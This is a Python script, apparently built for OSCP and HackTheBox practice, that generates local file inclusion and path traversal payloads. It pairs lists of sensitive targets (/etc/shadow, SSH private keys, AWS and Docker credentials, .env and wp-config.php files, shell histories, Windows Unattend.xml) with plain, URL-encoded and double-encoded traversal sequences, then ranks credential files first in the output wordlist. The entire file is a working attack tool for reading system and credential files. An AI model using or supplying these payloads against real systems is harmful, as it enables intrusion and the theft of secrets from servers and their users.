#!/usr/bin/env python3

import argparse
import os
from pathlib import Path

###############################################################################
# PRIORITY FILES
# External wordlist ex: https://github.com/danielmiessler/SecLists/blob/198047f1e22251e3b88b98b10e8bd15283e8a1e9/Fuzzing/LFI/LFI-Jhaddix.txt#L4
###############################################################################

PRIORITY = [
    "etc/passwd",
    "etc/shadow",
    "root/.ssh/id_rsa",
    "root/.bash_history",
    "var/www/html/.env",
    "var/www/html/wp-config.php",
    "var/www/html/config.php",

    r"Windows\win.ini",
    r"Windows\System32\drivers\etc\hosts",
    r"Windows\Panther\Unattend.xml",
    r"inetpub\wwwroot\web.config",
]

###############################################################################
# WINDOWS
###############################################################################

WINDOWS_TEMPLATES = [
    r"Users\{user}\.ssh\authorized_keys",
    r"Users\{user}\.ssh\id_rsa",
    r"Users\{user}\.ssh\id_dsa",
    r"Users\{user}\.ssh\id_ecdsa",
    r"Users\{user}\.ssh\id_ed25519",

    r"Users\{user}\Desktop\passwords.txt",
    r"Users\{user}\Desktop\creds.txt",
    r"Users\{user}\Desktop\notes.txt",

    r"Users\{user}\Documents\passwords.txt",
    r"Users\{user}\Documents\creds.txt",

    r"Users\{user}\NTUSER.DAT",

    r"Users\{user}\AppData\Roaming\FileZilla\sitemanager.xml",
    r"Users\{user}\AppData\Roaming\FileZilla\recentservers.xml",

    r"Users\{user}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",

    r"Users\{user}\.aws\credentials",
    r"Users\{user}\.aws\config",

    r"Users\{user}\.gitconfig",
    r"Users\{user}\.npmrc",

    r"inetpub\wwwroot\web.config",
    r"inetpub\wwwroot\web.config.bak",
    r"inetpub\wwwroot\web.config.old",

    r"Windows\System32\drivers\etc\hosts",
    r"Windows\Panther\Unattend.xml",
    r"Windows\win.ini",
]

###############################################################################
# LINUX
###############################################################################

LINUX_TEMPLATES = [
    r"home/{user}/.ssh/authorized_keys",
    r"home/{user}/.ssh/id_rsa",
    r"home/{user}/.ssh/id_dsa",
    r"home/{user}/.ssh/id_ecdsa",
    r"home/{user}/.ssh/id_ed25519",

    r"home/{user}/.bash_history",
    r"home/{user}/.zsh_history",

    r"home/{user}/.mysql_history",
    r"home/{user}/.psql_history",

    r"home/{user}/.aws/credentials",
    r"home/{user}/.aws/config",

    r"home/{user}/.docker/config.json",
    r"home/{user}/.kube/config",

    r"home/{user}/.gitconfig",
    r"home/{user}/.npmrc",

    r"var/www/html/.env",
    r"var/www/html/wp-config.php",
    r"var/www/html/config.php",

    r"etc/passwd",
    r"etc/shadow",
    r"etc/hosts",

    r"root/.ssh/id_rsa",
    r"root/.bash_history",
]

###############################################################################
# TRAVERSAL
###############################################################################

TRAVERSAL_STYLES = [
    "../",
    "..\\",
    "..%2f",
    "..%5c",
    "..%252f",
    "..%255c",
]

###############################################################################
# HELPERS
###############################################################################

def normalize(line):
    line = line.strip()

    while "//" in line:
        line = line.replace("//", "/")

    while "\\\\" in line:
        line = line.replace("\\\\", "\\")

    return line.rstrip("/\\")

def generate_paths(users):
    paths = set()

    for user in users:
        for p in WINDOWS_TEMPLATES:
            paths.add(p.format(user=user))

        for p in LINUX_TEMPLATES:
            paths.add(p.format(user=user))

    return paths

def generate_traversals(depth):
    payloads = []

    for style in TRAVERSAL_STYLES:
        for d in range(1, depth + 1):
            payloads.append(style * d)

    return payloads

def build_payloads(paths, depth):
    result = set()

    traversals = generate_traversals(depth)

    for p in paths:
        clean = p.lstrip("/\\")
        result.add(clean)

        for t in traversals:
            result.add(t + clean)

    return result

def load_external(files):
    result = []

    for f in files:
        try:
            with open(f, encoding="utf-8", errors="ignore") as fd:
                result.extend(fd.readlines())
        except Exception as e:
            print(f"[!] Failed to load {f}: {e}")

    return result

def load_external_dir(directory):
    files = []

    for root, _, names in os.walk(directory):
        for name in names:
            files.append(os.path.join(root, name))

    return load_external(files)

###############################################################################
# MAIN
###############################################################################

def main():
    parser = argparse.ArgumentParser(
        description="OSCP/HTB LFI Wordlist Generator"
    )

    parser.add_argument(
        "-u",
        "--users",
        default="viewer",
        help="viewer,admin,john"
    )

    parser.add_argument(
        "--depth",
        type=int,
        default=6,
        help="Traversal depth (default: 6)"
    )

    parser.add_argument(
        "--external",
        nargs="*",
        default=[],
        help="External wordlists"
    )

    parser.add_argument(
        "--external-dir",
        help="Directory containing wordlists"
    )

    parser.add_argument(
        "-o",
        "--output",
        default="payloads.txt"
    )

    args = parser.parse_args()

    users = [
        x.strip()
        for x in args.users.split(",")
        if x.strip()
    ]

    internal_paths = generate_paths(users)

    generated_payloads = build_payloads(
        internal_paths,
        args.depth
    )

    combined = list(generated_payloads)

    external_count = 0

    if args.external:
        ext = load_external(args.external)
        external_count += len(ext)
        combined.extend(ext)

    if args.external_dir:
        ext = load_external_dir(args.external_dir)
        external_count += len(ext)
        combined.extend(ext)

    final = []
    seen = set()

    for line in combined:

        line = line.strip()

        if not line:
            continue

        if line.startswith("#"):
            continue

        norm = normalize(line)

        if norm in seen:
            continue

        seen.add(norm)
        final.append(norm)

    priority_payloads = []
    normal_payloads = []

    for payload in final:
        matched = False

        for p in PRIORITY:
            if p.lower() in payload.lower():
                matched = True
                break

        if matched:
            priority_payloads.append(payload)
        else:
            normal_payloads.append(payload)

    output = priority_payloads + sorted(normal_payloads)

    with open(args.output, "w", encoding="utf-8") as f:
        for item in output:
            f.write(item + "\n")

    print()
    print("========== STATS ==========")
    print(f"Users               : {len(users)}")
    print(f"Internal paths      : {len(internal_paths)}")
    print(f"Generated payloads  : {len(generated_payloads)}")
    print(f"External payloads   : {external_count}")
    print(f"Final payloads      : {len(output)}")
    print(f"Output              : {args.output}")
    print("===========================")

if __name__ == "__main__":
    main()
